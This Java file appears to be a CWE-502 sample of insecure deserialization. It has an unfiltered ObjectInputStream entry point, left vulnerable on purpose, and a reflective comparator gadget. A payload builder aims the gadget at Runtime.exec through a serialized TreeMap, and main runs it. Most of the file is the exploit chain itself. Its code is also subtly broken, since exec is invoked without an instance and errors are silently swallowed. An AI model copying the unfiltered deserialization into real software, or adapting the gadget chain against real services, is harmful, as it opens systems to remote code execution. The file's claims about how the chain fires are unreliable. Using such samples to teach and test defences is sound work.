// CWE-502: Deserialization of Untrusted Data (complex gadget chain)
// Vulnerability: custom readObject invokes a comparator that triggers
// a chain of reflective method calls. Fixing only the ObjectInputStream
// entry point is insufficient — the gadget chain survives if the
// vulnerable Comparator class stays on the classpath.

import java.io.*;
import java.lang.reflect.*;
import java.util.*;

public class DeserializationGadgetChain {

    // Gadget class — looks like a benign utility comparator
    static class ReflectiveComparator implements Comparator<Object>, Serializable {
        private final String className;
        private final String methodName;

        ReflectiveComparator(String className, String methodName) {
            this.className = className;
            this.methodName = methodName;
        }

        @Override
        public int compare(Object o1, Object o2) {
            try {
                // Invokes arbitrary method on load — triggered during TreeMap deserialization
                Class<?> clazz = Class.forName(className);
                Method m = clazz.getMethod(methodName, String.class);
                m.invoke(null, o1.toString());
            } catch (Exception ignored) {}
            return 0;
        }
    }

    // Entry point — accepts serialized bytes from an HTTP request body
    public static Object deserializePayload(byte[] data) throws Exception {
        // VULNERABLE: no class filtering on ObjectInputStream
        try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data))) {
            return ois.readObject();
        }
    }

    // Trigger: deserializing a TreeMap with the malicious comparator
    // re-invokes compare() which fires the reflective chain
    public static byte[] buildGadgetPayload() throws Exception {
        ReflectiveComparator comparator = new ReflectiveComparator(
            "java.lang.Runtime", "exec"
        );
        TreeMap<String, String> map = new TreeMap<>(comparator);
        map.put("open -a Calculator", "");
        map.put("trigger", "");

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(baos)) {
            oos.writeObject(map);
        }
        return baos.toByteArray();
    }

    public static void main(String[] args) throws Exception {
        byte[] payload = buildGadgetPayload();
        // Simulates receiving attacker-controlled bytes over the network
        deserializePayload(payload);
    }
}
